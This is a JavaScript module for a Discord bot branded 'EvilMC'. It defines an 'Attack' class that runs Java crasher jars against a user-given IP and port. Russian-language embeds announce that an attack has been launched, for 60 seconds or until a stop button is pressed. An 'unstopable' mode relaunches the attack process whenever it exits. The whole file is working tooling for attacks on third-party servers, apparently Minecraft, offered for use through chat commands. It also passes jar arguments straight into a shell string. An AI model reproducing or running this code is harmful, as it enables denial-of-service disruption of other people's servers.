const Discord = require('discord.js');
const Client = require('./client.js');
const child = require('child_process');
const killPrc = require('tree-kill');

class Attack {
    /**
     * @typedef {{client: Client, interaction: Discord.CommandInteraction, jaroptions: {jarname: string, jarargs: string}, AttacksArray: Discord.Collection<string, Attack>, ownerID: string, msgID: string, embed: Discord.MessageEmbed, host: string, port: string, method: string, unstopable: boolean, crashPrc: child.ChildProcess, pid: Number}} AttackOptions
     * @param {AttackOptions} options 
     */
    constructor(options) {
        this.client = options.client,
            this.interaction = options.interaction,
            this.jaroptions = options.jaroptions,
            this.AttacksArray = options.AttacksArray,
            this.ownerID = options.ownerID,
            this.msgID = options.msgID,
            this.embed = options.embed,
            this.host = options.host,
            this.port = options.port,
            this.method = options.method,
            this.unstopable = options.unstopable,
            this.crashPrc = options.crashPrc,
            this.pid = options.pid

        this.runAttack();
    }

    runJar() {      
        let crash = child.exec(`java -jar jars/${this.jaroptions.jarname} ${this.jaroptions.jarargs}`, { detached: true }, (error, stdout, stderr) => {
            if (stderr) {
                console.log(`StdErr: ${stderr}`);
                return;
            }
            console.log(`Была запущена атака: ${this.jaroptions.jarname}`)
            console.log(`[Attack log] ${stdout}`);
        })

        this.crashPrc = crash;
        this.pid = crash.pid;

        if (this.unstopable) {
            crash.on("exit", (code, signal) => {
                this.runJar();
            })
        }
    }

    runAttack() {
        this.runJar();

        this.embed = new Discord.MessageEmbed()
            .setColor('RANDOM')
            .setFooter({
                text: `${this.interaction.guild.name} | EvilMC`,
                iconURL: this.client.user.avatarURL({ dynamic: true })
            });

        let runembed;

        if (this.unstopable == false) {
            runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);

            this.interaction.reply({ embeds: [runembed] })

            setTimeout(() => this.stopAttack(), 60000)
        } else {
            runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n  ► Атака запущена! ✅ \n ► До тех пор пока вы не нажмете остановить!!\n ☆ Made with ♥ by DesConnet ☆`);

            const stopBtn = new Discord.MessageButton()
                .setCustomId("stopAttack")
                .setLabel("Остановить")
                .setStyle("DANGER");

            this.interaction.reply({ embeds: [runembed], components: [new Discord.MessageActionRow({components: [stopBtn]})], fetchReply: true}).then((msg) => {
                this.msgID = msg.id;
            })
        }
    };

    stopAttack() {
        killPrc(this.pid);
        const endembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`);
        this.interaction.editReply({ embeds: [endembed], components: [] });
        this.crashPrc.removeAllListeners();
        this.AttacksArray.delete(this.host, this);
    };
}

module.exports = Attack;